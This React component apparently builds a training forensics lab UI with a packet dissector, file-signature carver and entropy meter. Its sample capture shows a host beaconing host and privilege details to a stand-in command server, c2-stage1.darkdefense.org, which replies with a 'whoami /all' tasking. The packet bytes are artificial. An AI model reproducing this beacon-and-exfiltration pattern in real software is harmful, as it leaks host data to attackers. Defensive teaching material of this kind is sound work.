import React, { useState, useMemo } from 'react';
import { ProfileThemeTokens } from '../types/profileTypes';
import { AppLogo } from '../../components/common/AppLogo';

interface Packet {
  id: number;
  time: string;
  srcIp: string;
  dstIp: string;
  protocol: 'TCP' | 'UDP' | 'DNS' | 'HTTP' | 'TLS' | 'ICMP';
  srcPort?: number;
  dstPort?: number;
  length: number;
  flags?: string[];
  summary: string;
  hex: string;
  ascii: string;
}

const SAMPLE_INCIDENT_BEACONING: Packet[] = [
  {
    id: 1,
    time: '0.000000',
    srcIp: '10.0.0.15',
    dstIp: '1.1.1.1',
    protocol: 'DNS',
    srcPort: 54812,
    dstPort: 53,
    length: 84,
    summary: 'Standard query 0x1a4f A c2-stage1.darkdefense.org',
    hex: '00 0c 29 8f a1 b2 00 50 56 c0 00 08 08 00 45 00 00 48 b1 a2 00 00 40 11 8a e1 0a 00 00 0f 01 01 01 01 d6 1c 00 35 00 34 a1 f2 1a 4f 01 00 00 01 00 00 00 00 00 00 09 63 32 2d 73 74 61 67 65 31 0b 64 61 72 6b 64 65 66 65 6e 73 65 03 6f 72 67 00 00 01 00 01',
    ascii: '..) ...PV.....E..H....@....\n.....5.4..O........c2-stage1.darkdefense.org....',
  },
  {
    id: 2,
    time: '0.014210',
    srcIp: '1.1.1.1',
    dstIp: '10.0.0.15',
    protocol: 'DNS',
    srcPort: 53,
    dstPort: 54812,
    length: 100,
    summary: 'Standard query response 0x1a4f A 185.220.101.5',
    hex: '00 50 56 c0 00 08 00 0c 29 8f a1 b2 08 00 45 00 00 58 12 a0 00 00 38 11 b9 21 01 01 01 01 0a 00 00 0f 00 35 d6 1c 00 44 f8 a9 1a 4f 81 80 00 01 00 01 00 00 00 00 c0 0c 00 01 00 01 00 00 01 2c 00 04 b9 dc 65 05',
    ascii: '.PV.....).....E..X....8..!....\n.....5...D..O............,....e.',
  },
  {
    id: 3,
    time: '0.038190',
    srcIp: '10.0.0.15',
    dstIp: '185.220.101.5',
    protocol: 'TCP',
    srcPort: 49202,
    dstPort: 443,
    length: 66,
    flags: ['SYN'],
    summary: '49202 → 443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1',
    hex: '00 0c 29 8f a1 b2 00 50 56 c0 00 08 08 00 45 00 00 34 39 a4 40 00 40 06 48 bc 0a 00 00 0f b9 dc 65 05 c0 32 01 bb 4f 12 a0 b1 00 00 00 00 80 02 fa f0 a1 9f 00 00 02 04 05 b4 01 03 03 08 01 01 04 02',
    ascii: '..) ...PV.....E..49.@.@.H.....e..2..O...........................',
  },
  {
    id: 4,
    time: '0.089420',
    srcIp: '185.220.101.5',
    dstIp: '10.0.0.15',
    protocol: 'TCP',
    srcPort: 443,
    dstPort: 49202,
    length: 66,
    flags: ['SYN', 'ACK'],
    summary: '443 → 49202 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460',
    hex: '00 50 56 c0 00 08 00 0c 29 8f a1 b2 08 00 45 00 00 34 00 00 40 00 34 06 a2 60 b9 dc 65 05 0a 00 00 0f 01 bb c0 32 e2 1a 80 01 4f 12 a0 b2 80 12 fe 88 b3 a1 00 00 02 04 05 b4 01 01 04 02 01 03 03 07',
    ascii: '.PV.....).....E..4..@.4..`..e...\n.......2....O...................',
  },
  {
    id: 5,
    time: '0.089850',
    srcIp: '10.0.0.15',
    dstIp: '185.220.101.5',
    protocol: 'TCP',
    srcPort: 49202,
    dstPort: 443,
    length: 54,
    flags: ['ACK'],
    summary: '49202 → 443 [ACK] Seq=1 Ack=1 Win=64240 Len=0',
    hex: '00 0c 29 8f a1 b2 00 50 56 c0 00 08 08 00 45 00 00 28 39 a5 40 00 40 06 48 c7 0a 00 00 0f b9 dc 65 05 c0 32 01 bb 4f 12 a0 b2 e2 1a 80 02 50 10 fa f0 b1 9f 00 00',
    ascii: '..) ...PV.....E..(9.@.@.H.....e..2..O.......P.......',
  },
  {
    id: 6,
    time: '0.102140',
    srcIp: '10.0.0.15',
    dstIp: '185.220.101.5',
    protocol: 'TLS',
    srcPort: 49202,
    dstPort: 443,
    length: 571,
    flags: ['PSH', 'ACK'],
    summary: 'Client Hello (TLSv1.2, JA3: e7d705a3286e19ea42f587b344ee6865)',
    hex: '16 03 01 02 00 01 00 01 fc 03 03 a1 b2 c3 d4 e5 f6 07 18 29 3a 4b 5c 6d 7e 8f 90 12 34 56 78 9a bc de f0 11 22 33 44 55 66 20 a0 b1 c2 d3 e4 f5 06 17 28 39 4a 5b 6c 7d 8e 9f 01 12 23 34 45 56 67 78 89 9a ab bc cd de ef 00 22 c0 2f c0 2b c0 13 c0 09',
    ascii: '...................) :K\\m~..4Vx....."3DUf ......(9J[l}.....#4EVgx....."/..+....',
  },
  {
    id: 7,
    time: '0.145890',
    srcIp: '185.220.101.5',
    dstIp: '10.0.0.15',
    protocol: 'TLS',
    srcPort: 443,
    dstPort: 49202,
    length: 1420,
    flags: ['PSH', 'ACK'],
    summary: 'Server Hello, Certificate, Server Key Exchange, Server Hello Done',
    hex: '16 03 03 05 84 02 00 00 4d 03 03 f0 e1 d2 c3 b4 a5 96 87 78 69 5a 4b 3c 2d 1e 0f 10 21 32 43 54 65 76 87 98 a9 ba cb dc ed fe 20 89 a1 b2 c3 d4 e5 f6 07 18 29 3a 4b 5c 6d 7e 8f 90 12 34 56 78 9a bc de f0 11 22 33 44 55 66 c0 2f 00 00 25 00 00 00 17 00 15 00',
    ascii: '........M........xiZK<-..!2CTev...........):K\\m~..4Vx....."3DUf./..%.......',
  },
  {
    id: 8,
    time: '0.210450',
    srcIp: '10.0.0.15',
    dstIp: '185.220.101.5',
    protocol: 'HTTP',
    srcPort: 49202,
    dstPort: 443,
    length: 312,
    flags: ['PSH', 'ACK'],
    summary: 'POST /submit.php?id=beacon_4892 HTTP/1.1 (Payload: Base64 Host Intel)',
    hex: '50 4f 53 54 20 2f 73 75 62 6d 69 74 2e 70 68 70 3f 69 64 3d 62 65 61 63 6f 6e 5f 34 38 39 32 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 63 32 2d 73 74 61 67 65 31 2e 64 61 72 6b 64 65 66 65 6e 73 65 2e 6f 72 67 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69 6f 6e 2f 6f 63 74 65 74 2d 73 74 72 65 61 6d 0d 0a 0d 0a 75 73 65 72 3d 7a 61 6b 61 72 26 68 6f 73 74 3d 57 49 4e 2d 45 4e 47 2d 30 31 26 70 72 69 76 3d 41 44 4d 49 4e',
    ascii: 'POST /submit.php?id=beacon_4892 HTTP/1.1\r\nHost: c2-stage1.darkdefense.org\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/octet-stream\r\n\r\nuser=zakar&host=WIN-ENG-01&priv=ADMIN',
  },
];

const KNOWN_FILE_SIGNATURES = [
  { magic: '7f 45 4c 46', name: 'ELF Executable', ext: '.elf / binary', desc: 'Linux Executable and Linkable Format binary' },
  { magic: '4d 5a', name: 'PE / DOS Executable', ext: '.exe / .dll / .sys', desc: 'Windows Portable Executable binary' },
  { magic: 'd4 c3 b2 a1', name: 'Libpcap Capture File', ext: '.pcap', desc: 'Wireshark / TCPdump microsecond capture format' },
  { magic: '0a 0d 0d 0a', name: 'PCAP Next Gen Capture', ext: '.pcapng', desc: 'Wireshark Next Generation packet capture format' },
  { magic: '50 4b 03 04', name: 'ZIP Archive', ext: '.zip / .docx / .jar', desc: 'PKZip Compressed Archive or Office Open XML container' },
  { magic: '25 50 44 46', name: 'PDF Document', ext: '.pdf', desc: 'Adobe Portable Document Format' },
  { magic: 'ff d8 ff', name: 'JPEG Image', ext: '.jpg / .jpeg', desc: 'JFIF / EXIF standard raster photo file' },
  { magic: '89 50 4e 47 0d 0a 1a 0a', name: 'PNG Image', ext: '.png', desc: 'Portable Network Graphics lossless image' },
];

export const ForensicsLabPane: React.FC<{ theme: ProfileThemeTokens }> = ({ theme }) => {
  const [activeTab, setActiveTab] = useState<'PCAP' | 'CARVER' | 'ENTROPY'>('PCAP');
  const [packets] = useState<Packet[]>(SAMPLE_INCIDENT_BEACONING);
  const [selectedPacket, setSelectedPacket] = useState<Packet>(SAMPLE_INCIDENT_BEACONING[7]);
  const [protocolFilter, setProtocolFilter] = useState<string>('ALL');
  const [searchQuery, setSearchQuery] = useState('');
  const [showStreamModal, setShowStreamModal] = useState(false);

  // File Carver & Entropy State
  const [inputHex, setInputHex] = useState(
    '4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00'
  );
  const [detectedType, setDetectedType] = useState<string>('PE / DOS Executable (.exe / .dll)');

  // Filtered Packets
  const filteredPackets = useMemo(() => {
    return packets.filter((p) => {
      const matchProto = protocolFilter === 'ALL' || p.protocol === protocolFilter;
      const q = searchQuery.toLowerCase();
      const matchQuery =
        !q ||
        p.srcIp.includes(q) ||
        p.dstIp.includes(q) ||
        p.summary.toLowerCase().includes(q) ||
        p.ascii.toLowerCase().includes(q);
      return matchProto && matchQuery;
    });
  }, [packets, protocolFilter, searchQuery]);

  // Shannon Entropy Calculation
  const entropyScore = useMemo(() => {
    const cleanHex = inputHex.replace(/[^0-9a-fA-F]/g, '');
    if (cleanHex.length < 2) return 0;

    const byteCounts: Record<number, number> = {};
    const totalBytes = Math.floor(cleanHex.length / 2);

    for (let i = 0; i < cleanHex.length; i += 2) {
      const byte = parseInt(cleanHex.substr(i, 2), 16);
      byteCounts[byte] = (byteCounts[byte] || 0) + 1;
    }

    let entropy = 0;
    for (const byte in byteCounts) {
      const p = byteCounts[byte] / totalBytes;
      if (p > 0) {
        entropy -= p * Math.log2(p);
      }
    }
    return Number(entropy.toFixed(3));
  }, [inputHex]);

  // Analyze Magic Bytes
  const handleAnalyzeMagicBytes = (hexStr: string) => {
    setInputHex(hexStr);
    const clean = hexStr.toLowerCase().replace(/[^0-9a-f]/g, '');
    let found = 'Unknown Raw Binary Stream';
    for (const sig of KNOWN_FILE_SIGNATURES) {
      const sigClean = sig.magic.toLowerCase().replace(/[^0-9a-f]/g, '');
      if (clean.startsWith(sigClean)) {
        found = `${sig.name} (${sig.ext}) - ${sig.desc}`;
        break;
      }
    }
    setDetectedType(found);
  };

  return (
    <div
      className="w-full h-full flex flex-col font-mono text-xs overflow-hidden"
      style={{ backgroundColor: theme.bgPrimary, color: theme.textPrimary }}
    >
      {/* Top Header & Tool Tabs */}
      <div
        className="h-10 px-3 border-b flex items-center justify-between flex-shrink-0"
        style={{ borderColor: theme.borderPrimary, backgroundColor: theme.bgSecondary }}
      >
        <div className="flex items-center gap-2">
          <AppLogo name="wireshark" className="w-5 h-5" />
          <span className="font-bold tracking-wider uppercase text-[11px]" style={{ color: theme.accentPrimary }}>
            DIGITAL FORENSICS LAB & PCAP CARVER
          </span>
          <span className="text-[10px] text-neutral-500">| INCIDENT_ID: BEACON_4892</span>
        </div>

        {/* Tab Controls */}
        <div className="flex items-center gap-1 bg-black/40 p-0.5 rounded border border-neutral-800">
          <button
            onClick={() => setActiveTab('PCAP')}
            className={`px-2 py-0.5 rounded text-[10px] font-bold transition-all cursor-pointer ${
              activeTab === 'PCAP' ? 'bg-sky-600 text-white' : 'text-neutral-400 hover:text-white'
            }`}
          >
            PCAP Dissector
          </button>
          <button
            onClick={() => setActiveTab('CARVER')}
            className={`px-2 py-0.5 rounded text-[10px] font-bold transition-all cursor-pointer ${
              activeTab === 'CARVER' ? 'bg-sky-600 text-white' : 'text-neutral-400 hover:text-white'
            }`}
          >
            Magic Bytes Carver
          </button>
          <button
            onClick={() => setActiveTab('ENTROPY')}
            className={`px-2 py-0.5 rounded text-[10px] font-bold transition-all cursor-pointer ${
              activeTab === 'ENTROPY' ? 'bg-sky-600 text-white' : 'text-neutral-400 hover:text-white'
            }`}
          >
            Entropy Analyzer
          </button>
        </div>
      </div>

      {/* TAB 1: PCAP DISSECTOR & PACKET CARVER */}
      {activeTab === 'PCAP' && (
        <div className="flex-1 flex flex-col overflow-hidden">
          {/* Controls Bar: Search & Protocol Filters */}
          <div
            className="h-9 px-3 border-b flex items-center justify-between gap-3 flex-shrink-0"
            style={{ borderColor: theme.borderPrimary, backgroundColor: theme.bgPanel }}
          >
            <div className="flex items-center gap-1.5 overflow-x-auto">
              <span className="text-[10px] text-neutral-400 uppercase font-bold">Filter:</span>
              {(['ALL', 'TCP', 'UDP', 'DNS', 'HTTP', 'TLS'] as const).map((proto) => (
                <button
                  key={proto}
                  onClick={() => setProtocolFilter(proto)}
                  className={`px-2 py-0.5 rounded-xs text-[10px] font-bold transition-colors cursor-pointer ${
                    protocolFilter === proto
                      ? 'bg-neutral-200 text-black'
                      : 'bg-neutral-800/80 text-neutral-400 hover:text-white'
                  }`}
                >
                  {proto}
                </button>
              ))}
            </div>

            <div className="flex items-center gap-2">
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search IP, port, payload..."
                className="px-2 py-0.5 rounded bg-black/60 border border-neutral-800 text-[10px] text-white focus:outline-none focus:border-sky-500 w-44"
              />
              <button
                onClick={() => setShowStreamModal(true)}
                className="px-2 py-0.5 rounded bg-emerald-600/20 text-emerald-400 border border-emerald-500/40 text-[10px] font-bold hover:bg-emerald-600/30 cursor-pointer"
              >
                Follow TCP Stream
              </button>
            </div>
          </div>

          {/* Packet Table & Detail Split */}
          <div className="flex-1 flex flex-col min-h-0">
            {/* Packet List Grid */}
            <div className="h-1/2 overflow-y-auto border-b" style={{ borderColor: theme.borderPrimary }}>
              <table className="w-full text-left border-collapse text-[11px]">
                <thead
                  className="sticky top-0 z-10 border-b font-bold uppercase text-[9px] text-neutral-400"
                  style={{ backgroundColor: theme.bgSecondary, borderColor: theme.borderPrimary }}
                >
                  <tr>
                    <th className="py-1 px-2 w-12">No.</th>
                    <th className="py-1 px-2 w-20">Time</th>
                    <th className="py-1 px-2 w-28">Source</th>
                    <th className="py-1 px-2 w-28">Destination</th>
                    <th className="py-1 px-2 w-16">Proto</th>
                    <th className="py-1 px-2 w-14">Len</th>
                    <th className="py-1 px-2">Info / Decoded Summary</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredPackets.map((pkt) => {
                    const isSelected = selectedPacket.id === pkt.id;
                    const protoColor =
                      pkt.protocol === 'DNS'
                        ? 'text-cyan-400'
                        : pkt.protocol === 'HTTP'
                        ? 'text-emerald-400'
                        : pkt.protocol === 'TLS'
                        ? 'text-purple-400'
                        : 'text-neutral-300';

                    return (
                      <tr
                        key={pkt.id}
                        onClick={() => setSelectedPacket(pkt)}
                        className={`border-b cursor-pointer transition-colors ${
                          isSelected
                            ? 'bg-sky-950/60 font-semibold'
                            : 'hover:bg-neutral-900/50 border-neutral-800/40'
                        }`}
                      >
                        <td className="py-1 px-2 font-mono text-neutral-500">{pkt.id}</td>
                        <td className="py-1 px-2 font-mono text-neutral-400">{pkt.time}</td>
                        <td className="py-1 px-2 font-mono text-white">{pkt.srcIp}</td>
                        <td className="py-1 px-2 font-mono text-white">{pkt.dstIp}</td>
                        <td className={`py-1 px-2 font-bold ${protoColor}`}>{pkt.protocol}</td>
                        <td className="py-1 px-2 font-mono text-neutral-400">{pkt.length}</td>
                        <td className="py-1 px-2 truncate text-neutral-300 max-w-xs">{pkt.summary}</td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>

            {/* Deep Packet Dissection & Hex View (Bottom Half) */}
            <div className="h-1/2 flex divide-x overflow-hidden" style={{ borderColor: theme.borderPrimary }}>
              {/* Left: OSI Protocol Tree */}
              <div className="w-1/2 p-3 overflow-y-auto space-y-2">
                <div className="text-[10px] font-bold uppercase tracking-wider text-sky-400">
                  Frame {selectedPacket.id} Dissection ({selectedPacket.length} bytes on wire)
                </div>

                <div className="space-y-1.5 text-[10px]">
                  <div className="p-1.5 rounded bg-black/40 border border-neutral-800">
                    <span className="font-bold text-neutral-300">Layer 2: Ethernet II</span>
                    <div className="pl-3 text-neutral-400 mt-0.5">
                      Src: 00:0c:29:8f:a1:b2 (VMware) | Dst: 00:50:56:c0:00:08 (Gateway)
                    </div>
                  </div>

                  <div className="p-1.5 rounded bg-black/40 border border-neutral-800">
                    <span className="font-bold text-neutral-300">Layer 3: IPv4 Header</span>
                    <div className="pl-3 text-neutral-400 mt-0.5">
                      Src IP: {selectedPacket.srcIp} → Dst IP: {selectedPacket.dstIp} | TTL: 64 | Header Len: 20 bytes
                    </div>
                  </div>

                  <div className="p-1.5 rounded bg-black/40 border border-neutral-800">
                    <span className="font-bold text-neutral-300">Layer 4: {selectedPacket.protocol} Transport</span>
                    <div className="pl-3 text-neutral-400 mt-0.5">
                      Ports: {selectedPacket.srcPort ?? 'N/A'} → {selectedPacket.dstPort ?? 'N/A'}{' '}
                      {selectedPacket.flags && `| Flags: [${selectedPacket.flags.join(', ')}]`}
                    </div>
                  </div>

                  <div className="p-1.5 rounded bg-sky-950/30 border border-sky-800/40">
                    <span className="font-bold text-sky-300">Layer 7: Application Payload</span>
                    <div className="pl-3 text-neutral-200 mt-0.5 font-mono text-[9px] break-all">
                      {selectedPacket.summary}
                    </div>
                  </div>
                </div>
              </div>

              {/* Right: Raw Hex & ASCII Dump */}
              <div className="w-1/2 p-3 flex flex-col overflow-hidden bg-black/70">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-[10px] font-bold uppercase text-neutral-400">
                    Raw Packet Hex & ASCII Dump
                  </span>
                  <button
                    onClick={() => navigator.clipboard.writeText(selectedPacket.hex)}
                    className="px-1.5 py-0.5 rounded text-[9px] bg-neutral-800 hover:text-white text-neutral-300 cursor-pointer"
                  >
                    Copy Hex
                  </button>
                </div>

                <div className="flex-1 font-mono text-[10px] overflow-y-auto leading-relaxed divide-y divide-neutral-900">
                  <div className="text-sky-300 select-all whitespace-pre-wrap break-all py-1">
                    {selectedPacket.hex}
                  </div>
                  <div className="text-emerald-400 select-all whitespace-pre-wrap break-all py-2">
                    {selectedPacket.ascii}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: MAGIC BYTES & FILE CARVER */}
      {activeTab === 'CARVER' && (
        <div className="flex-1 p-4 overflow-y-auto space-y-4">
          <div>
            <h3 className="text-sm font-bold text-white uppercase tracking-wider">File Signature & Magic Bytes Carver</h3>
            <p className="text-[11px] text-neutral-400 mt-0.5">
              Inspect suspicious binaries or carved disk streams. Detect executable masquerading as images or PDFs.
            </p>
          </div>

          <div className="space-y-2">
            <label className="text-[10px] uppercase font-bold text-neutral-300">File Header Hex Stream (First 16+ Bytes):</label>
            <input
              type="text"
              value={inputHex}
              onChange={(e) => handleAnalyzeMagicBytes(e.target.value)}
              className="w-full p-2.5 rounded bg-black/60 border border-neutral-800 text-white font-mono text-xs focus:outline-none focus:border-sky-500"
            />
          </div>

          {/* Analysis Result Card */}
          <div className="p-3 rounded-lg border border-sky-800/40 bg-sky-950/20 space-y-1.5">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold text-neutral-400 uppercase">IDENTIFIED SIGNATURE:</span>
              <span className="text-[9px] px-2 py-0.5 rounded bg-sky-500/20 text-sky-300 font-bold">VERIFIED MATCH</span>
            </div>
            <div className="text-sm font-bold text-white font-mono">{detectedType}</div>
          </div>

          {/* Quick Preset Signatures */}
          <div className="space-y-2">
            <span className="text-[10px] font-bold text-neutral-400 uppercase">Quick Test Signatures:</span>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
              {KNOWN_FILE_SIGNATURES.map((sig) => (
                <button
                  key={sig.name}
                  onClick={() => handleAnalyzeMagicBytes(sig.magic + ' 00 00 00 00 12 34 56 78')}
                  className="p-2 rounded bg-neutral-900 border border-neutral-800 hover:border-sky-600 text-left transition-colors cursor-pointer"
                >
                  <div className="font-bold text-white text-[11px]">{sig.name}</div>
                  <div className="text-[9px] font-mono text-neutral-400">{sig.magic}</div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: SHANNON ENTROPY ANALYZER */}
      {activeTab === 'ENTROPY' && (
        <div className="flex-1 p-4 overflow-y-auto space-y-4">
          <div>
            <h3 className="text-sm font-bold text-white uppercase tracking-wider">Shannon Entropy Malware Detector</h3>
            <p className="text-[11px] text-neutral-400 mt-0.5">
              Quantify randomness in binary streams. Scores &gt; 7.2 typically indicate encrypted payloads, packed shellcode, or ransomware.
            </p>
          </div>

          <div className="p-4 rounded-lg border border-neutral-800 bg-black/40 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold text-neutral-300">CALCULATED ENTROPY:</span>
              <span
                className={`text-lg font-black font-mono ${
                  entropyScore >= 7.2
                    ? 'text-red-400'
                    : entropyScore >= 5.0
                    ? 'text-amber-400'
                    : 'text-emerald-400'
                }`}
              >
                {entropyScore} / 8.000 bits
              </span>
            </div>

            {/* Visual Entropy Bar */}
            <div className="w-full h-3 bg-neutral-900 rounded-full overflow-hidden border border-neutral-800">
              <div
                className={`h-full transition-all duration-300 ${
                  entropyScore >= 7.2
                    ? 'bg-red-500'
                    : entropyScore >= 5.0
                    ? 'bg-amber-500'
                    : 'bg-emerald-500'
                }`}
                style={{ width: `${(entropyScore / 8) * 100}%` }}
              />
            </div>

            <div className="text-[10px] text-neutral-400">
              {entropyScore >= 7.2 ? (
                <span className="text-red-400 font-bold">
                  ⚠️ HIGH RISK: Stream exhibits high randomness consistent with UPX-packing, Cobalt Strike shellcode, or AES-encrypted C2 traffic.
                </span>
              ) : entropyScore >= 5.0 ? (
                <span className="text-amber-400 font-bold">
                  ℹ️ NORMAL: Typical compiled executable, compressed metadata, or standard x86/x64 instructions.
                </span>
              ) : (
                <span className="text-emerald-400 font-bold">
                  ✓ LOW RISK: Unpacked plaintext, ascii logs, or repetitive zero-padded data.
                </span>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Follow TCP Stream Modal */}
      {showStreamModal && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4">
          <div className="w-full max-w-2xl bg-neutral-950 border border-neutral-800 rounded-lg shadow-2xl flex flex-col max-h-[80vh]">
            <div className="p-3 border-b border-neutral-800 flex items-center justify-between">
              <span className="font-bold text-white text-xs">Reconstructed TCP Stream [10.0.0.15:49202 ⇄ 185.220.101.5:443]</span>
              <button
                onClick={() => setShowStreamModal(false)}
                className="px-2 py-0.5 rounded text-neutral-400 hover:text-white cursor-pointer"
              >
                ✕
              </button>
            </div>
            <div className="p-3 overflow-y-auto font-mono text-[10px] space-y-2 leading-relaxed">
              <div className="text-red-400">
                POST /submit.php?id=beacon_4892 HTTP/1.1<br />
                Host: c2-stage1.darkdefense.org<br />
                User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br />
                Content-Type: application/octet-stream<br />
                Content-Length: 48<br />
                <br />
                user=zakar&amp;host=WIN-ENG-01&amp;priv=ADMIN&amp;domain=WORKGROUP
              </div>
              <div className="text-blue-400">
                HTTP/1.1 200 OK<br />
                Server: nginx/1.18.0<br />
                Date: Tue, 15 Sep 2026 14:15:00 GMT<br />
                Content-Type: text/plain<br />
                <br />
                OK:EXEC:whoami /all
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
export default ForensicsLabPane;
